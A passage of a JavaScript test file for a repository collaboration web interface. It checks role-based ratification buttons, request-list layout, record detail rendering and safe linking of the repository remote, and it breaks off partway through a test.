import test from "node:test";
import assert from "node:assert/strict";
import { fileURLToPath } from "node:url";

import React from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { createServer } from "vite";

const uiRoot = fileURLToPath(new URL("..", import.meta.url));

// The satisfiers the shipped fold captures on these kinds, carried where the
// fold carries them: on each admitted statement, not in a lookup against the
// vocabulary in force now. The fold decides a ratification against the
// definition bound to the target when it was admitted, so the browser must
// read the same value or it will disagree with the fold the first time a kind
// is redefined. before-signing.test.mjs is where that disagreement is driven
// in both directions; these fixtures only have to be honest about where the
// value lives.
const ADMITTED = {
  propose: "role:ratifier",
  request: "none",
  report: "originating-requester",
  artifact: "none",
};
const admitted = (statement) => ({ ...statement, satisfier: ADMITTED[statement.kind] });

const ratifier = (name) => ({ name, kind: "human", roles: ["participant", "ratifier"], role_sources: {}, dormant_role_sources: {}, retired_role_sources: {} });
const bystander = (name) => ({ name, kind: "human", roles: ["participant"], role_sources: {}, dormant_role_sources: {}, retired_role_sources: {} });
const departedRatifier = (name) => ({ name, kind: "human", roles: ["ratifier"], retired: true, role_sources: {}, dormant_role_sources: {}, retired_role_sources: {} });

function workroom(presence, suppliedProjection) {
  const projection = suppliedProjection ?? {
    decisions: [],
    acts: [],
    statements: [],
    commitments: [],
    artifacts: [],
    actors: {},
    provenance: {},
  };
  return {
    actors: [
      { name: "claude", fingerprint: "a5d35aa7e4799472", roles: [], custody: true },
      { name: "claude", fingerprint: "0011223344ff5566", roles: [], custody: true },
    ],
    commits: [],
    graphTruncated: false,
    offline: false,
    localOffline: false,
    status: {
      durable: { genesis: "genesis", head: "head", depth: 1, projection },
      live: { cursor: { generation: "generation", position: 1 }, presence, activity: {}, conversations: [] },
      cursor: { frontier: [], live: { generation: "generation", position: 1 } },
    },
  };
}

const session = { credential: "browser", live: true, setActor() {} };

test("an addressed proposal-ratification request offers the requested decision directly", async () => {
  const vite = await createServer({
    root: uiRoot,
    appType: "custom",
    logLevel: "silent",
    server: { middlewareMode: true },
  });
  try {
    const { semanticActions } = await vite.ssrLoadModule("/src/components/Toolbar.tsx");
    const viewer = "hugh-fingerprint";
    const proposal = {
      event: "proposal",
      actor: "codex-fingerprint",
      kind: "propose",
      text: "Use the bounded status contract.",
      timestamp: 1,
    };
    const request = {
      event: "request",
      actor: "codex-fingerprint",
      kind: "request",
      text: "Hugh: ratify the proposal or deny it.",
      body: { to: viewer },
      timestamp: 2,
    };
    const projection = {
      decisions: [proposal, request].map(({ event }) => ({ event, verdict: "effective", reason: "recorded" })),
      acts: [],
      statements: [proposal, request].map(admitted),
      commitments: [{ request: request.event, requester: request.actor, addressed_to: viewer, status: "open" }],
      artifacts: [],
      actors: { [viewer]: ratifier("hugh") },
      provenance: { proposal: [], request: [proposal.event] },
    };
    const { buildRecordIndex } = await vite.ssrLoadModule("/src/lib/records.ts");
    const routed = [];
    const acted = [];
    const actions = semanticActions({
      statement: request,
      commitment: projection.commitments[0],
      decision: projection.decisions[1],
      projection,
      index: buildRecordIndex(projection),
      me: viewer,
      onRoute: (...args) => routed.push(args),
      doAct: (...args) => acted.push(args),
    });

    assert.deepEqual(actions.map(({ label }) => label), ["ratify yes", "deny"]);
    assert.doesNotMatch(actions.map(({ label }) => label).join(" "), /accept/);
    actions[0].run();
    actions[1].run();
    assert.deepEqual(acted, [["ratify:proposal", { act: "ratify", target: proposal.event }]]);
    assert.deepEqual(routed, [["dissent", [proposal.event], ""]]);

    const ordinary = semanticActions({
      statement: { ...request, event: "ordinary-request", text: "Implement the feature." },
      commitment: { ...projection.commitments[0], request: "ordinary-request" },
      decision: { event: "ordinary-request", verdict: "effective", reason: "recorded" },
      projection: {
        ...projection,
        statements: [{ ...request, event: "ordinary-request", text: "Implement the feature." }],
        provenance: { "ordinary-request": [] },
      },
      index: buildRecordIndex(projection),
      me: viewer,
      onRoute() {},
      doAct() {},
    });
    assert.deepEqual(ordinary.map(({ label }) => label), ["accept"]);
  } finally {
    await vite.close();
  }
});

// Authority, not sign-in. The fold decides a ratification by the satisfier
// admitted with the target: `propose` named `role:ratifier`, so an actor
// without that role gets an ineffective record and a permanent row in the log
// saying they tried. The toolbar used to offer the button to every signed-in
// actor, which is how that row came to be written. Denying needs no authority
// and stays.
//
// The roles are what varies here. What happens when the admitted satisfier and
// the live vocabulary disagree is a different question, driven on the rendered
// screen in before-signing.test.mjs.
test("a ratification is offered only to an actor the fold would let ratify", async () => {
  const vite = await createServer({ root: uiRoot, appType: "custom", logLevel: "silent", server: { middlewareMode: true } });
  try {
    const { semanticActions } = await vite.ssrLoadModule("/src/components/Toolbar.tsx");
    const { buildRecordIndex } = await vite.ssrLoadModule("/src/lib/records.ts");
    const viewer = "hugh-fingerprint";
    const proposal = admitted({ event: "proposal", sequence: 1, actor: "codex-fingerprint", kind: "propose", text: "Use it.", timestamp: 1 });
    const build = (statement, actors) => ({
      decisions: [{ event: "proposal", sequence: 1, verdict: "effective", reason: "recorded" }],
      acts: [],
      statements: [statement],
      commitments: [],
      artifacts: [],
      actors,
      provenance: {},
    });
    const labels = (statement, actors) => {
      const projection = build(statement, actors);
      return semanticActions({
        statement,
        projection,
        index: buildRecordIndex(projection),
        me: viewer,
        onRoute() {},
        doAct() {},
      }).map(({ label }) => label);
    };

    assert.deepEqual(labels(proposal, { [viewer]: ratifier("hugh") }), ["agree", "disagree"]);
    assert.deepEqual(labels(proposal, { [viewer]: bystander("hugh") }), ["disagree"], "no ratifier role, no agree button");
    assert.deepEqual(labels(proposal, {}), [], "an actor the roster does not carry has no ordinary state route");
    // A statement carrying no satisfier proves nothing about who may ratify
    // it: either the fold bound it no definition, or the projection is too old
    // to say. Layer 6 already refuses to present a partial projection as
    // authoritative, and showing the button anyway would be guessing.
    assert.deepEqual(
      labels({ ...proposal, satisfier: undefined }, { [viewer]: ratifier("hugh") }),
      ["disagree"],
      "no admitted satisfier, no proof",
    );
  } finally {
    await vite.close();
  }
});

// This synthetic departed-ratifier shape is not emitted by the fold: an active
// role grant rests on active membership. It pins the browser's direct
// ratification dispatch to `decideRatify`, without adding the ordinary state
// composer's participant gate to `mayRatify` or `canRatify`. The matching
// composer routes remain withheld below because those sign state, which does
// require participant membership.
test("a departed ratifier keeps all direct ratifications and no composer routes", async () => {
  const vite = await createServer({ root: uiRoot, appType: "custom", logLevel: "silent", server: { middlewareMode: true } });
  try {
    const { semanticActions } = await vite.ssrLoadModule("/src/components/Toolbar.tsx");
    const { buildRecordIndex } = await vite.ssrLoadModule("/src/lib/records.ts");
    const viewer = "departed-ratifier";
    const actors = { [viewer]: departedRatifier("departed ratifier") };
    const decision = (event) => ({ event, verdict: "effective", reason: "recorded" });
    const labels = ({ statement, commitment, statements = [statement], decisions = statements.map(({ event }) => decision(event)), provenance = {} }) => {
      const projection = { decisions, acts: [], statements, commitments: commitment ? [commitment] : [], artifacts: [], actors, provenance };
      return semanticActions({
        statement,
        commitment,
        decision: decisions.find(({ event }) => event === statement.event),
        projection,
        index: buildRecordIndex(projection),
        me: viewer,
        onRoute() {},
        doAct() {},
      }).map(({ label }) => label);
    };

    const proposal = admitted({ event: "proposal", actor: "author", kind: "propose", text: "Adopt this.", timestamp: 1 });
    const request = admitted({ event: "request", actor: "author", kind: "request", text: "Ratify or deny.", body: { to: viewer }, timestamp: 2 });
    const reportTarget = admitted({ event: "report-target", actor: "author", kind: "assert", text: "Work item.", timestamp: 3 });
    const report = { event: "report", actor: "performer", kind: "report", text: "Finished.", satisfier: "role:ratifier", timestamp: 4 };
    const artifact = admitted({ event: "artifact", actor: "author", kind: "artifact", text: "Candidate.", body: { path: "notes/decision.md" }, timestamp: 5 });

    assert.deepEqual(labels({ statement: proposal }), ["agree"], "role-authorized agreement must not gain a participant gate");
    assert.deepEqual(
      labels({
        statement: request,
        commitment: { request: request.event, requester: request.actor, addressed_to: viewer, status: "open" },
        statements: [proposal, request],
        decisions: [decision(proposal.event), decision(request.event)],
        provenance: { [proposal.event]: [], [request.event]: [proposal.event] },
      }),
      ["ratify yes"],
      "the addressed direct proposal ratification must not gain a participant gate",
    );
    assert.deepEqual(
      labels({
        statement: reportTarget,
        commitment: { request: "request", requester: "author", performer: report.actor, report: report.event, status: "reported" },
        statements: [reportTarget, report],
        decisions: [decision(reportTarget.event), decision(report.event)],
      }),
      ["accept"],
      "the report ratification must not gain a participant gate",
    );
    assert.deepEqual(labels({ statement: artifact }), [], "a departed ratifier must not open ordinary state composition");
  } finally {
    await vite.close();
  }
});

test("every Toolbar state route withholds its composer from a departed participant", async () => {
  const vite = await createServer({ root: uiRoot, appType: "custom", logLevel: "silent", server: { middlewareMode: true } });
  try {
    const { semanticActions } = await vite.ssrLoadModule("/src/components/Toolbar.tsx");
    const { buildRecordIndex } = await vite.ssrLoadModule("/src/lib/records.ts");
    const viewer = "departed-fingerprint";
    const live = { [viewer]: bystander("departed") };
    const departed = { [viewer]: departedRatifier("departed") };
    const decision = (event) => ({ event, verdict: "effective", reason: "recorded" });
    const labels = ({ statement, commitment, statements = [statement], decisions = statements.map(({ event }) => decision(event)), provenance = {} }, actors) => {
      const projection = { decisions, acts: [], statements, commitments: commitment ? [commitment] : [], artifacts: [], actors, provenance };
      return semanticActions({
        statement,
        commitment,
        decision: decisions.find(({ event }) => event === statement.event),
        projection,
        index: buildRecordIndex(projection),
        me: viewer,
        onRoute() {},
        doAct() {},
      }).map(({ label }) => label);
    };

    const request = admitted({ event: "request", actor: "author", kind: "request", text: "Please do this.", body: { to: viewer }, timestamp: 1 });
    const proposal = admitted({ event: "proposal", actor: "author", kind: "propose", text: "Adopt this.", timestamp: 2 });
    const artifact = admitted({ event: "artifact", actor: "author", kind: "artifact", text: "The candidate.", body: { path: "notes/decision.md" }, timestamp: 3 });
    const promiseTarget = admitted({ event: "promise-target", actor: "author", kind: "assert", text: "Work is underway.", timestamp: 4 });
    const reportTarget = admitted({ event: "report-target", actor: "author", kind: "assert", text: "The work item.", timestamp: 5 });
    const report = admitted({ event: "report", actor: "performer", kind: "report", text: "Finished.", timestamp: 6 });

    const routes = [
      ["request accept", { statement: request, commitment: { request: request.event, requester: request.actor, addressed_to: viewer, status: "open" } }, ["accept"], []],
      [
        "deny",
        {
          statement: request,
          commitment: { request: request.event, requester: request.actor, addressed_to: viewer, status: "open" },
          statements: [request, proposal],
          decisions: [decision(request.event), decision(proposal.event)],
          provenance: { [request.event]: [proposal.event], [proposal.event]: [] },
        },
        ["deny"],
        ["ratify yes"],
      ],
      ["disagree", { statement: proposal }, ["disagree"], ["agree"]],
      ["artifact proposal and review", { statement: artifact }, ["propose adoption", "request review"], []],
      [
        "mark done",
        { statement: promiseTarget, commitment: { request: "request", performer: viewer, promise: "promise", status: "promised" } },
        ["mark done"],
        [],
      ],
      [
        "needs work",
        {
          statement: reportTarget,
          commitment: { request: "request", requester: viewer, performer: report.actor, report: report.event, status: "reported" },
          statements: [reportTarget, report],
          decisions: [decision(reportTarget.event), decision(report.event)],
        },
        ["accept", "needs work"],
        [],
      ],
    ];

    for (const [name, input, whenLive, whenDeparted] of routes) {
      assert.deepEqual(labels(input, live), whenLive, `${name}: live participant still sees the route`);
      assert.deepEqual(labels(input, departed), whenDeparted, `${name}: departed viewer does not open ordinary state composition`);
    }

    const ownRecord = admitted({ event: "own-record", actor: viewer, kind: "assert", text: "Withdrawable.", timestamp: 7 });
    assert.deepEqual(
      labels({ statement: ownRecord }, departed),
      ["withdraw"],
      "own-authored withdraw stays available to a departed actor because it signs supersede, not state",
    );
  } finally {
    await vite.close();
  }
});



// The reason an act carries no force belongs beside that act. This is the
// regression that matters: the previous surface counted unreadable acts in a
// panel and a header badge while the explanation lived only in a hover title,
// so the room looked broken and no reader could learn why.








// One line, fixed columns, no wrapping at 1,024 pixels. A static render is
// where the row's shape is decided: five cells, each of them clipped rather
// than allowed to grow the row to two lines.
test("every row is one line of exactly five fixed columns", async () => {
  const vite = await createServer({ root: uiRoot, appType: "custom", logLevel: "silent", server: { middlewareMode: true } });
  try {
    const { RequestList } = await vite.ssrLoadModule("/src/components/RequestList.tsx");
    const statements = [
      { event: "e1", sequence: 1, actor: "hugh", kind: "request", text: "A request whose first line is the title\nand whose second line is not", timestamp: 1786500000 },
    ];
    const projection = {
      decisions: [{ event: "e1", sequence: 1, verdict: "effective", reason: "recorded" }],
      acts: [], statements,
      commitments: [{ request: "e1", requester: "hugh", addressed_to: "codex", status: "open" }],
      reviews: [], artifacts: [],
      actors: { codex: { name: "codex", kind: "agent", roles: [], role_sources: {}, dormant_role_sources: {}, retired_role_sources: {} } },
      provenance: {},
    };
    const markup = renderToStaticMarkup(
      React.createElement(RequestList, {
        view: { query: "", population: "live" },
        onView() {},
        workroom: {
          actors: [{ name: "codex", fingerprint: "codex", roles: [], custody: true }],
          offline: false,
          status: {
            durable: { genesis: "genesis", head: "head", depth: 1, projection },
            live: { cursor: { generation: "g", position: 1 }, presence: {}, activity: {}, conversations: [] },
            cursor: { frontier: [], live: { generation: "g", position: 1 } },
          },
        },
        onOpenThread() {},
      }),
    );

    assert.match(markup, /table-fixed/);
    const row = markup.slice(markup.indexOf("<tbody>"), markup.indexOf("</tbody>"));
    assert.equal((row.match(/<td/g) ?? []).length, 5, "a row is five columns and no more");
    assert.equal((row.match(/truncate/g) ?? []).length, 5, "every cell clips rather than wrapping");
    // The title is the request's first line only.
    assert.match(row, /A request whose first line is the title/);
    assert.doesNotMatch(row, /whose second line is not/);
    // No author, no topic, no worktree pill, no ratified badge, no per-row staleness.
    assert.doesNotMatch(row, /hugh|stale|worktree|topic/i);
    // Exactly one headline number, and it equals the rows below it.
    assert.match(markup, /1 open request<\/h2>/);
  } finally {
    await vite.close();
  }
});

test("the outcome graph preserves the table selection and exposes only recorded relations", async () => {
  const vite = await createServer({ root: uiRoot, appType: "custom", logLevel: "silent", server: { middlewareMode: true } });
  try {
    const { RequestList, defaultListView } = await vite.ssrLoadModule("/src/components/RequestList.tsx");
    const statements = [
      { event: "basis", sequence: 1, actor: "hugh", kind: "request", text: "Recorded basis", timestamp: 1 },
      { event: "proposal", sequence: 2, actor: "hugh", kind: "propose", text: "Ratified proposal", timestamp: 2, ratified: true, ratified_by: "ratify-act" },
      { event: "replacement", sequence: 4, actor: "hugh", kind: "request", text: "Replacement request", timestamp: 4 },
      { event: "request", sequence: 6, actor: "hugh", kind: "request", text: "Selected request", body: { conditions: "waits on an invented condition" }, timestamp: 6 },
    ];
    const acts = [
      { event: "ratify-act", sequence: 3, actor: "hugh", type: "ratify", target: "proposal", verdict: "effective", reason: "recorded" },
      { event: "supersede-act", sequence: 5, actor: "hugh", type: "supersede", target: "request", verdict: "effective", reason: "recorded" },
    ];
    const projection = {
      decisions: [...statements, ...acts].map(({ event, sequence }) => ({ event, sequence, verdict: "effective", reason: "recorded" })),
      acts,
      statements,
      commitments: [
        { request: "basis", requester: "hugh", addressed_to: "codex", status: "open" },
        { request: "replacement", requester: "hugh", addressed_to: "codex", status: "open" },
        { request: "request", requester: "hugh", performer: "codex", promise: "promise", status: "promised", waiting_on: "codex" },
      ],
      reviews: [], artifacts: [],
      actors: { codex: { name: "codex", kind: "agent", roles: [], role_sources: {}, dormant_role_sources: {}, retired_role_sources: {} } },
      provenance: { "ratify-act": ["proposal"], "supersede-act": ["replacement"], request: ["basis", "proposal"] },
    };
    const room = workroom({}, projection);
    const table = renderToStaticMarkup(React.createElement(RequestList, { workroom: room, view: defaultListView, onView() {}, onOpenThread() {} }));
    assert.match(table, /data-board-presentation="table"/, "Table is not the initial presentation");
    const graph = renderToStaticMarkup(React.createElement(RequestList, { workroom: room, view: { ...defaultListView, query: "Selected", presentation: "graph" }, onView() {}, onOpenThread() {} }));
    assert.doesNotMatch(graph, /data-board-presentation="table"/, "Graph left the table mounted beside it");
    assert.match(graph, /data-outcome-card="request"/, "the searched table row was not a focal graph card");
    assert.match(graph, /data-outcome-card="basis"/, "the exact direct basis was not shown as bounded context");
    assert.match(
      graph,
      /aria-label="rests on: basis is a direct basis for request\. Reverse: request rests on basis\."/,
      "the accessible relation label dropped an exact event id or its reverse reading",
    );
    assert.match(graph, /Waits on codex/, "the projected waiting_on value is not displayed");
    assert.equal((graph.match(/Waits on codex/g) ?? []).length, 1, "an addressed request without waiting_on borrowed a next mover");
    assert.doesNotMatch(graph, /invented condition/, "conditions prose became an inferred graph relation");
    assert.match(graph, /solid.*rests on.*dotted.*ratified by.*dashed.*superseded/, "relation form, not colour alone, is not explained");
    assert.match(graph, /data-relation="ratified-by"[\s\S]*?stroke-dasharray="2 5"/, "ratification is not drawn with the documented dotted line");
    assert.match(graph, /data-relation="superseded"[\s\S]*?stroke-dasharray="8 5"/, "supersession is not drawn with the documented dashed line");
  } finally {
    await vite.close();
  }
});

// Withdrawing a ratification must bring the action back. The toolbar used to
// ask whether the viewer had ever ratified, which is a different question:
// once withdrawn, the act is no longer in force, and a lawful re-ratification
// was hidden forever. What is in force is `ratified_by`, and only the fold can
// say which act that is.
test("a withdrawn ratification offers the decision again", async () => {
  const vite = await createServer({
    root: uiRoot,
    appType: "custom",
    logLevel: "silent",
    server: { middlewareMode: true },
  });
  try {
    const { semanticActions } = await vite.ssrLoadModule("/src/components/Toolbar.tsx");
    const viewer = "hugh-fingerprint";
    const proposal = { event: "proposal", actor: "codex-fingerprint", kind: "propose", text: "Use it.", timestamp: 1 };
    const request = {
      event: "request", actor: "codex-fingerprint", kind: "request",
      text: "Hugh: ratify the proposal or deny it.", body: { to: viewer }, timestamp: 2,
    };
    // The viewer ratified, then withdrew it. ratified_by is what the fold says
    // stands now; the ratify act itself is still in the projection, still
    // marked effective, which is exactly why searching the acts cannot answer.
    const build = (ratifiedBy) => ({
      decisions: [
        { event: "proposal", verdict: "effective", reason: "recorded" },
        { event: "request", verdict: "effective", reason: "recorded" },
      ],
      acts: [
        { event: "ratify-a", actor: viewer, type: "ratify", target: "proposal", verdict: "effective", reason: "recorded" },
        { event: "withdraw-a", actor: viewer, type: "supersede", target: "ratify-a", verdict: "effective", reason: "recorded" },
      ],
      statements: [{ ...proposal, ratified: ratifiedBy !== undefined, ratified_by: ratifiedBy }, request].map(admitted),
      commitments: [{ request: "request", requester: request.actor, addressed_to: viewer, status: "open" }],
      artifacts: [],
      actors: { [viewer]: ratifier("hugh") },
      provenance: { proposal: [], request: ["proposal"] },
    });
    const { buildRecordIndex } = await vite.ssrLoadModule("/src/lib/records.ts");

    const withdrawn = build(undefined);
    const afterWithdrawal = semanticActions({
      statement: request, commitment: withdrawn.commitments[0], decision: withdrawn.decisions[1],
      projection: withdrawn, index: buildRecordIndex(withdrawn),
      me: viewer, onRoute() {}, doAct() {},
    });
    assert.deepEqual(
      afterWithdrawal.map(({ label }) => label),
      ["ratify yes", "deny"],
      "the ratification was withdrawn, so ratifying again is offered",
    );

    const standing = build("ratify-a");
    const whileStanding = semanticActions({
      statement: request, commitment: standing.commitments[0], decision: standing.decisions[1],
      projection: standing, index: buildRecordIndex(standing),
      me: viewer, onRoute() {}, doAct() {},
    });
    assert.deepEqual(
      whileStanding.map(({ label }) => label),
      ["deny"],
      "while the viewer's ratification stands, ratifying again is not offered",
    );
  } finally {
    await vite.close();
  }
});

// Withdraw is offered on authorship, and authorship is the fold's rule for an
// ordinary record and not for a roster one. The fold projects a statement row
// for every state record it admits -- membership grants and role grants
// included -- so a roster record reaches this toolbar as an unrecognised kind
// that matches none of the branches above, and the only action left for it is
// `withdraw`. `decideSupersede` routes a roster target through governance
// before it ever reads the author: the founding seed can never be retired, an
// operator grant needs `operator`, every other roster change needs `ratifier`.
// So the button was offering an act the fold refuses, to the one person the
// fold does not ask about.
test("withdraw is not offered on a roster record the viewer authored", async () => {
  const vite = await createServer({ root: uiRoot, appType: "custom", logLevel: "silent", server: { middlewareMode: true } });
  try {
    const { semanticActions } = await vite.ssrLoadModule("/src/components/Toolbar.tsx");
    const { buildRecordIndex } = await vite.ssrLoadModule("/src/lib/records.ts");
    const viewer = "hugh-fingerprint";
    // The shape internal/app writes when an actor joins: kind "roster" on the
    // statement, and body.kind carrying the actor kind, which is a different
    // field entirely.
    const grant = {
      event: "grant", actor: viewer, kind: "roster", satisfier: "role:ratifier",
      text: "codex joins as agent", timestamp: 1,
      body: { actor: "codex-fingerprint", kind: "agent", name: "codex", role: "participant" },
    };
    const ordinary = { event: "note", actor: viewer, kind: "assert", satisfier: "none", text: "The build is red.", timestamp: 2 };
    const projection = {
      decisions: [grant, ordinary].map(({ event }) => ({ event, verdict: "effective", reason: "recorded" })),
      acts: [],
      statements: [grant, ordinary],
      commitments: [],
      artifacts: [],
      actors: { [viewer]: ratifier("hugh") },
      provenance: { grant: [], note: [] },
    };
    const index = buildRecordIndex(projection);
    const labels = (statement) =>
      semanticActions({
        statement, decision: projection.decisions.find(({ event }) => event === statement.event),
        projection, index, me: viewer, onRoute() {}, doAct() {},
      }).map(({ label }) => label);

    assert.deepEqual(
      labels(grant),
      [],
      "false offer: decideSupersede decides a roster target by standing, and the viewer's authorship is not standing",
    );
    // The positive control. Without it an empty list proves only that
    // semanticActions returned nothing, which a broken fixture also does.
    assert.deepEqual(
      labels(ordinary),
      ["withdraw"],
      "false refusal: the roster exclusion must not take the ordinary own-authored withdraw with it",
    );
  } finally {
    await vite.close();
  }
});

// The thread row abbreviates; the detail under it does not. Every fact the
// projection holds about the record is shown whole, and each basis is a link.
test("a record's detail shows full ids, body fields and both directions of provenance", async () => {
  const vite = await createServer({ root: uiRoot, appType: "custom", logLevel: "silent", server: { middlewareMode: true } });
  try {
    const { RecordDetail } = await vite.ssrLoadModule("/src/components/RecordDetail.tsx");
    const { buildRecordIndex } = await vite.ssrLoadModule("/src/lib/records.ts");
    const request = "1111111111111111111111111111111111111111";
    const promise = "2222222222222222222222222222222222222222";
    const report = "3333333333333333333333333333333333333333";
    const codex = "codexfingerprint0000000000000000";
    const hugh = "hughfingerprint00000000000000000";
    const projection = {
      decisions: [{ event: promise, sequence: 2, verdict: "effective", reason: "recorded" }],
      acts: [],
      statements: [
        { event: request, sequence: 1, actor: hugh, kind: "request", text: "Do the thing\nwith a second line", timestamp: 1786500000, body: { to: codex } },
        { event: promise, sequence: 2, actor: codex, kind: "promise", text: "Claimed", timestamp: 1786500100, body: { head: "abcdef0123456789abcdef0123456789abcdef01" }, ratified: true },
        { event: report, sequence: 3, actor: codex, kind: "report", text: "Done", timestamp: 1786500200 },
      ],
      commitments: [],
      reviews: [],
      artifacts: [],
      actors: { [codex]: { name: "codex", kind: "agent", roles: [] }, [hugh]: { name: "hugh", kind: "person", roles: [] } },
      provenance: { [promise]: [request], [report]: [promise] },
    };
    const opened = [];
    const markup = renderToStaticMarkup(
      React.createElement(RecordDetail, {
        event: promise,
        index: buildRecordIndex(projection),
        actors: projection.actors,
        tickets: new Map([[request, 1], [promise, 2], [report, 3]]),
        nameOf: (fingerprint) => projection.actors[fingerprint]?.name ?? fingerprint,
        onOpenThread: (event) => opened.push(event),
      }),
    );
    // The whole id, not a prefix; the actor by name and by whole fingerprint.
    assert.match(markup, new RegExp(promise));
    assert.match(markup, new RegExp(`codex.*${codex}`));
    // Every body field, unabbreviated.
    assert.match(markup, /abcdef0123456789abcdef0123456789abcdef01/);
    // Both directions of provenance, each naming the record it points at.
    const restsOn = markup.slice(markup.indexOf("rests on"), markup.indexOf("rested on by"));
    assert.match(restsOn, new RegExp(`#1.*Do the thing.*${request}`));
    assert.doesNotMatch(restsOn, /second line/);
    const restedOnBy = markup.slice(markup.indexOf("rested on by"));
    assert.match(restedOnBy, new RegExp(`#3.*Done.*${report}`));
    // The fold's ruling and the record's flags.
    assert.match(markup, /effective/);
    assert.match(markup, /ratified/);
  } finally {
    await vite.close();
  }
});

// A row is closed until clicked. The rail stays one line of fixed columns,
// and no detail is drawn for a station that names neither a record nor a commit.
test("thread rows start closed and only rows naming something are expandable", async () => {
  const vite = await createServer({ root: uiRoot, appType: "custom", logLevel: "silent", server: { middlewareMode: true } });
  try {
    const { Thread } = await vite.ssrLoadModule("/src/components/Thread.tsx");
    const { buildRecordIndex } = await vite.ssrLoadModule("/src/lib/records.ts");
    const request = "1111111111111111111111111111111111111111";
    const projection = {
      decisions: [{ event: request, sequence: 1, verdict: "effective", reason: "recorded" }],
      acts: [],
      statements: [{ event: request, sequence: 1, actor: "hugh", kind: "request", text: "Do the thing", timestamp: 1786500000, body: { to: "codex" } }],
      commitments: [{ request, requester: "hugh", addressed_to: "codex", status: "open" }],
      reviews: [],
      artifacts: [],
      actors: { codex: { name: "codex", kind: "agent", roles: [] }, hugh: { name: "hugh", kind: "person", roles: [] } },
      provenance: {},
    };
    const markup = renderToStaticMarkup(
      React.createElement(Thread, {
        index: buildRecordIndex(projection),
        workroom: workroom({}, projection),
        session,
        frames: [],
        root: request,
        pending: [],
        onBack() {},
        onOpenThread() {},
        onSay: () => "id",
        onSayFailed() {},
        doAct() {},
      }),
    );
    const rows = markup.split(/(?=<li[^>]*data-station)/).filter((part) => part.includes("data-station"));
    assert.equal(rows.length, 2, "request and unclaimed promise");
    assert.match(rows[0], /data-station="root"/);
    assert.match(rows[0], /<button[^>]*aria-expanded="false"[^>]*aria-controls="detail-root"/, "the request row's text is a closed disclosure button");
    assert.doesNotMatch(rows[1], /aria-expanded/, "an unreached station has nothing to open");
    assert.doesNotMatch(markup, /data-record-detail/, "nothing is open until clicked");
  } finally {
    await vite.close();
  }
});

// The list shows the population its caller holds. Owning the view outside
// the list is what lets it survive a trip into a thread and back.
test("the request list renders the population and sort its caller holds", async () => {
  const vite = await createServer({ root: uiRoot, appType: "custom", logLevel: "silent", server: { middlewareMode: true } });
  try {
    const { RequestList } = await vite.ssrLoadModule("/src/components/RequestList.tsx");
    const projection = {
      decisions: [],
      acts: [],
      statements: [
        { event: "open", sequence: 1, actor: "hugh", kind: "request", text: "Still open", timestamp: 1786500000 },
        { event: "gone", sequence: 2, actor: "hugh", kind: "request", text: "Went stale", timestamp: 1786500000 },
      ],
      commitments: [
        { request: "open", requester: "hugh", addressed_to: "codex", status: "open" },
        { request: "gone", requester: "hugh", addressed_to: "codex", status: "stale" },
      ],
      reviews: [],
      artifacts: [],
      actors: { codex: { name: "codex", kind: "agent", roles: [] } },
      provenance: {},
    };
    const render = (view) =>
      renderToStaticMarkup(
        React.createElement(RequestList, {
          workroom: workroom({}, projection),
          onOpenThread() {},
          view,
          onView() {},
        }),
      );
    const stale = render({ query: "", population: "stale" });
    assert.match(stale, /1 stale request, not in flight<\/h2>/);
    assert.match(stale, /Went stale/);
    assert.doesNotMatch(stale.slice(stale.indexOf("<tbody>")), /Still open/);
    const live = render({ query: "", population: "live" });
    assert.match(live, /1 open request<\/h2>/);
  } finally {
    await vite.close();
  }
});

// The reference bound is load-bearing: more references than the limit shows
// the limit, says exactly how many are not shown, and opening shows the rest.
test("a record with many references shows the first twelve and says how many more there are", async () => {
  const vite = await createServer({ root: uiRoot, appType: "custom", logLevel: "silent", server: { middlewareMode: true } });
  try {
    const { RecordDetail, REFERENCE_LIMIT } = await vite.ssrLoadModule("/src/components/RecordDetail.tsx");
    const { buildRecordIndex } = await vite.ssrLoadModule("/src/lib/records.ts");
    const base = "base0000000000000000000000000000000000000";
    const dependents = Array.from({ length: 30 }, (_, i) => `dep${String(i).padStart(37, "0")}`);
    const projection = {
      decisions: [],
      acts: [],
      statements: [
        { event: base, sequence: 1, actor: "hugh", kind: "propose", text: "Adopt X" },
        ...dependents.map((event, i) => ({ event, sequence: i + 2, actor: "claude", kind: "assert", text: `Depends ${i}` })),
      ],
      commitments: [],
      artifacts: [],
      actors: {},
      provenance: Object.fromEntries(dependents.map((event) => [event, [base]])),
    };
    const markup = renderToStaticMarkup(
      React.createElement(RecordDetail, {
        event: base,
        index: buildRecordIndex(projection),
        actors: projection.actors,
        tickets: new Map(),
        nameOf: (f) => f,
        onOpenThread() {},
      }),
    );
    assert.equal(REFERENCE_LIMIT, 12);
    const shown = dependents.filter((event) => markup.includes(`data-ref="${event}"`));
    assert.equal(shown.length, REFERENCE_LIMIT, "exactly the limit is rendered");
    assert.deepEqual(shown, dependents.slice(0, REFERENCE_LIMIT), "the first ones, in order");
    assert.match(markup, /18 more not shown — show all 30/);
  } finally {
    await vite.close();
  }
});

// ---------------------------------------------------------------------------
// The repository path in the top bar links to its remote when one is safe to
// link. What makes it safe is the substance: the href is the only place a
// string from git config becomes something the browser will navigate.
// ---------------------------------------------------------------------------

const REPO_PATH = "/Users/someone/play/gitseq";

async function topBarMarkup(vite, repoRemote) {
  const { TopBar } = await vite.ssrLoadModule("/src/components/TopBar.tsx");
  const room = { ...workroom({}), repo: REPO_PATH, repoRemote };
  return renderToStaticMarkup(
    React.createElement(TopBar, { workroom: room, session: {}, onJumpEvent() {}, onPublish() {} }),
  );
}

test("an https remote turns the repository path into a link that cannot reach its opener", async () => {
  const vite = await createServer({ root: uiRoot, appType: "custom", logLevel: "silent", server: { middlewareMode: true } });
  try {
    const markup = await topBarMarkup(vite, "https://github.com/generalbusiness-ai/gitseq.git");
    const anchor = markup.match(/<a\b[^>]*>/);
    assert.ok(anchor, "the repository path did not render as a link");
    assert.match(anchor[0], /href="https:\/\/github\.com\/generalbusiness-ai\/gitseq\.git"/);
    assert.match(anchor[0], /rel="noopener noreferrer"/, "a new-tab link must not hand the opener over");
    assert.match(anchor[0], /target="_blank"/);
    assert.ok(markup.includes(REPO_PATH), "the link still reads as the served path");
  } finally {
    await vite.close();
  }
});

// The fallback is not "something reasonable"; it is byte-for-byte the markup a
// repository with no remote produces, so an unlinkable remote can never be
// told apart from no remote at all.
test("an unlinkable remote renders exactly as no remote does", async () => {
  const vite = await createServer({ root: uiRoot, appType: "custom", logLevel: "silent", server: { middlewareMode: true } });
  try {
    const none = await topBarMarkup(vite, undefined);
